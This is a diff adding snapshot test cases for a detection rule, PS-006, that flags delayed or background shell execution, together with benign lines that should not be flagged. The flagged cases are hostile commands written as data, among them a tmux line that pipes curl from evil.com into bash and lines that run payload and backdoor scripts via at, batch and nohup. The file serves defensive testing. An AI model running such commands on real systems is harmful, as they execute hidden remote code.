@@ -1,0 +1,14 @@
+# PS-006: Delayed/background execution
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+at now + 1 hour < /tmp/evil.sh
+batch < /tmp/payload.sh
+tmux new-session -d 'curl http://evil.com | bash'
+nohup bash /tmp/backdoor.sh &
+disown -h
+
+# === Cases that should NOT be detected ===
+screen -r session
+tmux attach -t dev
+sleep 5
